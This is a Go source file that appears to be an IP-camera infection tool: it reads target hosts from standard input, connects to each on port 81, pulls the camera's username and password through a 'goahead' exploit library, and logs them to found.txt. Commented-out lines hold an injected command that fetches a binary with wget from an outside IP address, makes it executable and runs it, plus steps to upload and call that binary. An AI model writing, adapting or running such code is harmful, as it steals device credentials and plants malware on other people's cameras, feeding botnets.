package main

import (
	"bufio"
	"fmt"
	"goahead/lib/core/ipcam"
	"goahead/lib/utils"
	"os"
)

func appendLineToFile(filename, line string) error {
    file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        return fmt.Errorf("erreur lors de l'ouverture du fichier %s : %w", filename, err)
    }
    defer file.Close()

    _, err = fmt.Fprintf(file, "%s\n", line)
    if err != nil {
        return fmt.Errorf("erreur lors de l'Ã©criture de la ligne dans le fichier %s : %w", filename, err)
    }
    return nil
}

func Infect(Host string) {
	Cam, Err := ipcam.GetIpCamera(Host)

	if utils.HandleError(Err) || utils.HandleError(Cam.GetCredentials()) {
		return
	}

	fmt.Printf("[%s] %s:%s\n", Cam.Socket.RemoteAddr(), Cam.Username, Cam.Password)

	appendLineToFile("found.txt", fmt.Sprintf("[%s] %s:%s", Cam.Socket.RemoteAddr(), Cam.Username, Cam.Password))

	return

	// to edit:

	//Payload := "wget%20http%3A%2F%2F109.206.241.221%2Fa%3Bchmod%20777%20%2A%3B.%2Fa"
	//Payload := "wget http://109.206.241.221/a;chmod 777 *;./a"

	/*if utils.HandleError(Cam.UploadBinary(Payload)) {
		return
	}*/

	//fmt.Printf("[%s] Binary sent", Cam.Socket.RemoteAddr())

	/*if utils.HandleError(Cam.CallBinary()) {
		return
	}*/

	//fmt.Printf("[%s] Binary called\n", Cam.Socket.RemoteAddr())
}

func main() {
	for {
		r := bufio.NewReader(os.Stdin)
		scan := bufio.NewScanner(r)
		for scan.Scan() {
			go Infect(scan.Text() + ":81")
		}
	}
}